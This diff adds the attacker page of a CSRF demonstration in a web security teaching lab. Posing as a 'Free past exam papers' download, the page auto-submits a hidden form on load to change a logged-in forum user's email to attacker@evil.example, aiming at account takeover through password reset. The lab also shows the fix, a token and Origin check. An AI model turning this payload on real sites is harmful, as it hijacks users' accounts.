@@ -1,0 +1,81 @@
+<!doctype html>
+<!--
+=============================================================================
+  DEMO 4 - the attacker's page for the CSRF demonstration.
+
+  This file is part of the teaching lab. It is not served by Django; you serve
+  it yourself from a *different origin* so that it genuinely is another
+  website:
+
+      cd attacker
+      python -m http.server 9000
+
+  then open http://127.0.0.1:9000/attacker.html while logged into the forum at
+  http://127.0.0.1:8000/.
+
+  What it does: it contains a hidden form pointed at the forum's profile view
+  and submits it with JavaScript as soon as the page loads. The visitor's
+  browser attaches their forum session cookie automatically, because browsers
+  send cookies based on where a request is *going*, not where it came *from*.
+  The forum therefore sees a normal, logged-in request to change the email
+  address.
+
+  The attacker cannot read the response - the same-origin policy stops that -
+  and does not need to. One state-changing action is enough: change the email,
+  then use "forgot password" to take over the account.
+
+  In SECURE_MODE=1 the forum checks the CSRF token and the Origin header, this
+  page cannot supply either, and the request is refused with 403.
+=============================================================================
+-->
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Free past exam papers!</title>
+  <style>
+    body { font-family: system-ui, sans-serif; max-width: 40rem; margin: 4rem auto;
+           padding: 0 1rem; line-height: 1.6; }
+    .small { color: #666; font-size: 0.85rem; border-top: 1px solid #ddd;
+             margin-top: 3rem; padding-top: 1rem; }
+    code { background: #f2f2f2; padding: 0.1rem 0.3rem; }
+  </style>
+</head>
+<body>
+
+  <h1>Free past exam papers</h1>
+  <p>Loading your download, please wait...</p>
+  <p>Thanks for visiting! Your download will begin automatically.</p>
+
+  <!--
+    The whole attack. It is invisible to the visitor.
+    The action points at the forum on port 8000; this page is on port 9000.
+  -->
+  <form id="csrf-attack" method="POST"
+        action="http://127.0.0.1:8000/profile/"
+        target="hidden-frame"
+        style="display:none">
+    <input type="hidden" name="email" value="attacker@evil.example">
+  </form>
+
+  <!-- The response lands in this hidden frame so the page does not navigate
+       away. The attacker cannot read what is inside it. -->
+  <iframe name="hidden-frame" style="display:none"></iframe>
+
+  <script>
+    // Submit the hidden form the moment the page loads. No click required.
+    document.getElementById('csrf-attack').submit();
+  </script>
+
+  <div class="small">
+    <p><strong>This is the attacker's page in demo 4 of the web security lab.</strong>
+    It just tried to change the email address of whoever is logged into the forum
+    at <code>127.0.0.1:8000</code>. Go and reload
+    <code>http://127.0.0.1:8000/profile/</code> to see whether it worked.</p>
+    <p>In vulnerable mode it will have worked. In <code>SECURE_MODE=1</code> the
+    forum answers 403 Forbidden and the email is unchanged. To see the 403
+    yourself, remove <code>target="hidden-frame"</code> from the form so the
+    response is displayed instead of hidden.</p>
+  </div>
+
+</body>
+</html>
